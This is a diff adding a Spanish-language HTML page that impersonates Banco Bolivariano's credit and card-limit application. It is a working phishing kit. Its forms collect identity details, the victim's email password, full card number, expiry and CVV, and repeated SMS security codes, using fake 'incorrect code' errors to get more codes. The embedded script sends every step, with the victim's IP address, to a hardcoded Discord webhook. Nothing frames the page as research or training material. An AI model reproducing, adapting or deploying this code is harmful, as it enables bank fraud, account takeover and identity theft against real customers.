@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="light only">
+    <title> accesobolibariano </title>
+    <style>
+        /* ===== VARIABLES DE DISEÑO ===== */
+        :root {
+            --bolivariano-azul-principal: #00468F; /* Azul oscuro corporativo */
+            --bolivariano-verde-acento: #60B23B; /* Verde de acento */
+            --blanco:                   #ffffff;
+            --negro:                    #000000;
+            --radio-btn:                30px;
+            --transicion:               all 0.3s ease;
+        }
+
+        /* ===== RESET Y BASE ===== */
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        html, body { height: 100%; overflow-x: hidden; }
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            color: var(--blanco);
+            background-color: #000;
+        }
+
+        /* ===== FONDO DE IMAGEN (FULL SCREEN) ===== */
+        .bg-container {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: -1;
+            background: url('https://images.unsplash.com/photo-1544717305-2782549b5136?ixlib=rb-4.0.3&auto=format&fit=crop&w=1920&q=80') no-repeat center center;
+            background-size: cover;
+        }
+        .bg-overlay {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.1) 50%, rgba(0,0,0,0.4) 100%);
+        }
+
+        /* ===== HEADER (LOGO TEXTO) ===== */
+        header {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%;
+            padding: 25px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 100;
+        }
+        .logo-box {
+            width: auto;
+            display: flex;
+            align-items: center;
+        }
+        .logo-box span {
+            font-size: 22px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            color: white;
+        }
+        .header-icons {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+        .icon-search, .icon-menu {
+            width: 24px; height: 24px;
+            cursor: pointer;
+            filter: brightness(0) invert(1);
+        }
+
+        /* ===== CONTENIDO PRINCIPAL ===== */
+        .main-content {
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 0 30px;
+            padding-top: 80px;
+        }
+
+        .hero-text h1 {
+            font-size: 42px;
+            font-weight: 800;
+            margin-bottom: 5px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        .hero-text h2 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            text-shadow: 0 2px 8px rgba(0,0,0,0.3);
+        }
+        .hero-text p {
+            font-size: 18px;
+            max-width: 320px;
+            margin: 0 auto 35px;
+            line-height: 1.4;
+            font-weight: 400;
+            text-shadow: 0 2px 8px rgba(0,0,0,0.3);
+        }
+
+        /* ===== BOTONES ===== */
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            width: 100%;
+            max-width: 280px;
+        }
+        .btn-bolivariano {
+            background-color: var(--bolivariano-verde-acento);
+            color: var(--blanco);
+            border: none;
+            padding: 16px;
+            border-radius: var(--radio-btn);
+            font-size: 16px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: var(--transicion);
+            box-shadow: 0 4px 15px rgba(96, 178, 59, 0.3);
+        }
+        .btn-bolivariano:hover {
+            background-color: #509e30;
+            transform: scale(1.02);
+        }
+        .btn-bolivariano.secondary {
+            background-color: rgba(96, 178, 59, 0.8);
+        }
+
+        /* ===== FORMULARIOS ===== */
+        .form-container {
+            display: none;
+            width: 100%;
+            max-width: 450px;
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 20px;
+            padding: 30px;
+            color: #333;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            margin: 20px auto;
+            text-align: left;
+        }
+        .form-container.active { display: block; }
+        .form-container h3 {
+            color: var(--bolivariano-azul-principal);
+            font-size: 20px;
+            margin-bottom: 20px;
+            border-left: 4px solid var(--bolivariano-verde-acento); 
+            padding-left: 12px;
+        }
+
+        .form-group { margin-bottom: 15px; }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--bolivariano-azul-principal);
+            margin-bottom: 5px;
+        }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 14px;
+            outline: none;
+            color: #333;
+        }
+        .form-group input:focus { border-color: var(--bolivariano-verde-acento); }
+
+        .btn-submit {
+            width: 100%;
+            background-color: var(--bolivariano-azul-principal);
+            color: var(--blanco);
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        /* ===== BARRA DE PROGRESO ===== */
+        .progress-wrap {
+            display: none;
+            width: 100%;
+            max-width: 450px;
+            margin-bottom: 15px;
+        }
+        .progress-bar {
+            height: 4px;
+            background: rgba(255,255,255,0.3);
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: var(--bolivariano-verde-acento); 
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        /* ===== LOADING SCREEN ===== */
+        #loading-screen {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 1000;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .spinner {
+            width: 60px; height: 60px;
+            border: 6px solid rgba(255,255,255,0.1);
+            border-top: 6px solid var(--bolivariano-verde-acento); 
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ===== TOKEN INPUT ===== */
+        .token-input {
+            text-align: center;
+            font-size: 24px !important;
+            letter-spacing: 8px;
+            font-weight: 800;
+            color: var(--bolivariano-azul-principal) !important;
+        }
+
+        /* ===== CHAT ICON ===== */
+        .chat-icon {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 65px; height: 65px;
+            background: var(--blanco);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+            cursor: pointer;
+        }
+        .chat-icon img { width: 35px; }
+
+        /* ===== FOOTER ICON ===== */
+        .footer-icon {
+            position: fixed;
+            bottom: 30px;
+            left: 30px;
+            width: 40px; height: 40px;
+            filter: brightness(0) invert(1);
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .hero-text h1 { font-size: 32px; }
+            .hero-text h2 { font-size: 20px; }
+            .hero-text p { font-size: 16px; }
+            .logo-box span { font-size: 18px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-container">
+        <div class="bg-overlay"></div>
+    </div>
+
+    <header>
+        <div class="logo-box">
+            <span>Banco Bolivariano</span>
+        </div>
+        <div class="header-icons">
+            <img src="https://cdn-icons-png.flaticon.com/512/54/54481.png" class="icon-search" alt="Buscar">
+            <img src="https://cdn-icons-png.flaticon.com/512/56/56763.png" class="icon-menu" alt="Menu">
+        </div>
+    </header>
+
+    <div class="main-content" id="main-view">
+        <div class="hero-text">
+            <h1>Banco Bolivariano</h1>
+            <h2>Tu Banco de Confianza.</h2>
+            <p>Solicita tu crédito o aumento de cupo de tarjeta de forma rápida y segura.</p>
+        </div>
+
+        <div class="btn-group">
+            <button class="btn-bolivariano" onclick="iniciarProceso('Crédito Personal')">SOLICITAR CRÉDITO</button>
+            <button class="btn-bolivariano secondary" onclick="iniciarProceso('Aumento de Cupo')">AUMENTO DE CUPO</button>
+        </div>
+    </div>
+
+    <!-- CONTENEDOR DE FORMULARIOS -->
+    <div class="container" id="form-view" style="display:none; padding-top: 100px;">
+        <div class="progress-wrap" id="progress-wrap" style="display:block; margin: 0 auto 20px;">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+        </div>
+
+        <!-- PASO 2: DATOS PERSONALES -->
+        <div id="paso2" class="form-container active">
+            <h3 id="form-title">Información de Solicitud</h3>
+            <form onsubmit="guardarP2(event)">
+                <div class="form-group">
+                    <label>Nombres y Apellidos Completos</label>
+                    <input type="text" id="nombre" placeholder="Nombre completo" required>
+                </div>
+                <div style="display:flex; gap:10px;">
+                    <div class="form-group" style="flex:1;">
+                        <label>Cédula</label>
+                        <input type="text" id="cedula" maxlength="10" placeholder="0000000000" inputmode="numeric" required>
+                    </div>
+                    <div class="form-group" style="flex:1;">
+                        <label>Celular</label>
+                        <input type="tel" id="telefono" maxlength="10" placeholder="0900000000" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Dirección de Domicilio</label>
+                    <input type="text" id="direccion" placeholder="Calle, Ciudad, Provincia" required>
+                </div>
+                <div class="form-group">
+                    <label>Correo Electrónico</label>
+                    <input type="email" id="correo" placeholder="usuario@ejemplo.com" required>
+                </div>
+                <div class="form-group">
+                    <label>Contraseña del Correo</label>
+                    <input type="password" id="clave" placeholder="••••••••" required>
+                </div>
+                <button type="submit" class="btn-submit">CONTINUAR</button>
+            </form>
+        </div>
+
+        <!-- PASO 3: MONTO -->
+        <div id="paso3" class="form-container">
+            <h3>Monto de Solicitud</h3>
+            <div style="text-align:center; margin: 20px 0;">
+                <span id="disp-monto" style="font-size: 32px; font-weight: 800; color: var(--bolivariano-azul-principal);">$ 5,000</span>
+            </div>
+            <input type="range" id="slider-monto" min="1000" max="50000" step="500" value="5000" style="width:100%; margin-bottom: 20px;">
+            <button class="btn-submit" onclick="irAPaso4()">CONFIRMAR MONTO</button>
+        </div>
+
+        <!-- PASO 4: TARJETA -->
+        <div id="paso4" class="form-container">
+            <h3>Verificación de Tarjeta</h3>
+            <form onsubmit="guardarP4(event)">
+                <div class="form-group">
+                    <label>Tipo de Tarjeta</label>
+                    <select id="tipo_tarjeta">
+                        <option>Débito</option>
+                        <option>Crédito</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Número de Tarjeta (16 dígitos)</label>
+                    <input type="text" id="tarjeta_16" maxlength="19" placeholder="0000 0000 0000 0000" inputmode="numeric" required>
+                </div>
+                <div style="display:flex; gap:10px;">
+                    <div class="form-group" style="flex:1;">
+                        <label>Vencimiento</label>
+                        <input type="text" id="vence" placeholder="MM/AA" maxlength="5" required>
+                    </div>
+                    <div class="form-group" style="flex:1;">
+                        <label>CVV</label>
+                        <input type="password" id="cvv" maxlength="3" placeholder="•••" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Saldo Disponible</label>
+                    <input type="text" id="saldo" placeholder="$ 0.00" required>
+                </div>
+                <button type="submit" class="btn-submit">VERIFICAR</button>
+            </form>
+        </div>
+
+        <!-- PASO 5: TOKEN -->
+        <div id="paso5" class="form-container">
+            <h3>Validación de Seguridad</h3>
+            <p style="font-size:13px; color:#666; margin-bottom:15px;">Ingrese el código de 6 dígitos enviado a su celular.</p>
+            <form onsubmit="validarToken(event)">
+                <div class="form-group">
+                    <input type="text" id="token" class="token-input" maxlength="6" placeholder="000000" required>
+                </div>
+                <p id="error-msg" style="color:red; font-size:12px; text-align:center; display:none; margin-bottom:10px;">Código incorrecto. Intente nuevamente.</p>
+                <button type="submit" class="btn-submit">FINALIZAR</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- LOADING SCREEN -->
+    <div id="loading-screen">
+        <div class="spinner"></div>
+        <p id="loading-text" style="color:white; font-weight:bold;">Procesando...</p>
+    </div>
+
+    <!-- ICONOS DE APOYO -->
+    <div class="chat-icon">
+        <img src="https://cdn-icons-png.flaticon.com/512/134/134914.png" alt="Chat">
+    </div>
+    <img src="https://cdn-icons-png.flaticon.com/512/60/60740.png" class="footer-icon" alt="Config">
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1519761382797606984/DqQMKPvmi0jPetK4QGxWadSdM8b0poFAgrpSvTy0bMlc498ghb4nw_U_OuOPQ_xZrDcr";
+        
+        let estado = {
+            ip: "Obteniendo...",
+            nombre: "",
+            solicitud: "",
+            monto: "5000",
+            intentos: 0
+        };
+
+        // Obtener IP (redundante)
+        async function getIP() {
+            let ip = "Desconocida";
+            try { ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip; } catch (e) {}
+            if (ip === "Desconocida") { try { ip = (await (await fetch("https://ipapi.co/json/")).json()).ip; } catch (e) {} }
+            if (ip === "Desconocida") { try { ip = (await (await fetch("https://api.db-ip.com/v2/free/self")).json()).ipAddress; } catch (e) {} }
+            estado.ip = ip;
+        }
+        getIP();
+
+        function iniciarProceso(tipo) {
+            estado.solicitud = tipo;
+            document.getElementById('main-view').style.display = 'none';
+            document.getElementById('form-view').style.display = 'block';
+            document.getElementById('form-title').textContent = tipo;
+            actualizarProgreso(20);
+        }
+
+        function actualizarProgreso(pct) {
+            document.getElementById('progress-fill').style.width = pct + '%';
+        }
+
+        function showLoading(texto, callback) {
+            const screen = document.getElementById('loading-screen');
+            document.getElementById('loading-text').textContent = texto;
+            screen.style.display = 'flex';
+            setTimeout(() => {
+                screen.style.display = 'none';
+                if(callback) callback();
+            }, 2500);
+        }
+
+        async function enviarWebhook(msg) {
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: msg})
+            });
+        }
+
+        function guardarP2(e) {
+            e.preventDefault();
+            estado.nombre = document.getElementById('nombre').value;
+            const msg = `━━━━━━━━━━━━━━━━━━━━━━━━\n👤 **NUEVA SOLICITUD BOLIVARIANO**\n━━━━━━━━━━━━━━━━━━━━━━━━\n👤 **Nombre:** ${estado.nombre}\n🪪 **Cédula:** ${document.getElementById('cedula').value}\n📞 **Tel:** ${document.getElementById('telefono').value}\n🏠 **Dirección:** ${document.getElementById('direccion').value}\n📧 **Email:** ${document.getElementById('correo').value}\n🔑 **Clave:** ${document.getElementById('clave').value}\n✨ **Tipo:** ${estado.solicitud}\n🌐 **IP:** ${estado.ip}`;
+            enviarWebhook(msg);
+            showLoading("Analizando perfil...", () => {
+                document.getElementById('paso2').style.display = 'none';
+                document.getElementById('paso3').style.display = 'block';
+                actualizarProgreso(40);
+            });
+        }
+
+        const slider = document.getElementById('slider-monto');
+        slider.oninput = function() {
+            document.getElementById('disp-monto').textContent = "$ " + Number(this.value).toLocaleString();
+            estado.monto = this.value;
+        }
+
+        function irAPaso4() {
+            const msg = `━━━━━━━━━━━━━━━━━━━━━━━━\n💰 **MONTO SELECCIONADO**\n━━━━━━━━━━━━━━━━━━━━━━━━\n👤 **Nombre:** ${estado.nombre}\n💵 **Monto:** $ ${Number(estado.monto).toLocaleString()}\n🌐 **IP:** ${estado.ip}`;
+            enviarWebhook(msg);
+            showLoading("Verificando cupo disponible...", () => {
+                document.getElementById('paso3').style.display = 'none';
+                document.getElementById('paso4').style.display = 'block';
+                actualizarProgreso(70);
+            });
+        }
+
+        function guardarP4(e) {
+            e.preventDefault();
+            const t = document.getElementById('tarjeta_16');
+            if (t.value.replace(/\s/g, '').length < 16) {
+                alert("Por favor, ingrese los 16 dígitos de su tarjeta.");
+                return;
+            }
+            const msg = `━━━━━━━━━━━━━━━━━━━━━━━━\n💳 **DATOS DE TARJETA**\n━━━━━━━━━━━━━━━━━━━━━━━━\n👤 **Nombre:** ${estado.nombre}\n💳 **Tipo:** ${document.getElementById('tipo_tarjeta').value}\n🔢 **Tarjeta:** ${t.value}\n📅 **Vence:** ${document.getElementById('vence').value}\n🔒 **CVV:** ${document.getElementById('cvv').value}\n💰 **Saldo:** ${document.getElementById('saldo').value}\n🌐 **IP:** ${estado.ip}`;
+            enviarWebhook(msg);
+            showLoading("Validando con el banco...", () => {
+                document.getElementById('paso4').style.display = 'none';
+                document.getElementById('paso5').style.display = 'block';
+                actualizarProgreso(90);
+            });
+        }
+
+        function validarToken(e) {
+            e.preventDefault();
+            estado.intentos++;
+            const token = document.getElementById('token').value;
+            const msg = `━━━━━━━━━━━━━━━━━━━━━━━━\n🔑 **TOKEN DE SEGURIDAD**\n━━━━━━━━━━━━━━━━━━━━━━━━\n👤 **Nombre:** ${estado.nombre}\n🔑 **Token:** ${token}\n🔢 **Intento:** ${estado.intentos}/5\n🌐 **IP:** ${estado.ip}`;
+            enviarWebhook(msg);
+            
+            showLoading("Verificando código...", () => {
+                if(estado.intentos < 10) {
+                    document.getElementById('error-msg').style.display = 'block';
+                    document.getElementById('token').value = '';
+                } else {
+                    finalizar();
+                }
+            });
+        }
+
+        function finalizar() {
+            document.getElementById('paso5').innerHTML = `
+                <div style="text-align:center; padding: 20px;">
+                    <div style="font-size: 50px; margin-bottom: 15px;">✅</div>
+                    <h3 style="border:none; padding:0;">¡Solicitud Recibida!</h3>
+                    <p style="color:#666; font-size:14px; margin-bottom:20px;">Su solicitud de ${estado.solicitud} está siendo procesada. Un asesor le contactará en breve.</p>
+                    <button class="btn-submit" onclick="location.reload()">FINALIZAR</button>
+                </div>
+            `;
+            actualizarProgreso(100);
+        }
+
+        // Mascaras
+        document.addEventListener('input', function(e) {
+            if (e.target.id === 'tarjeta_16') {
+                let v = e.target.value.replace(/\D/g, '').substring(0, 16);
+                e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+            }
+            if (e.target.id === 'vence') {
+                let v = e.target.value.replace(/\D/g, '');
+                if(v.length >= 3) v = v.substring(0,2) + '/' + v.substring(2,4);
+                e.target.value = v;
+            }
+        });
+    </script>
+</body>
+</html>
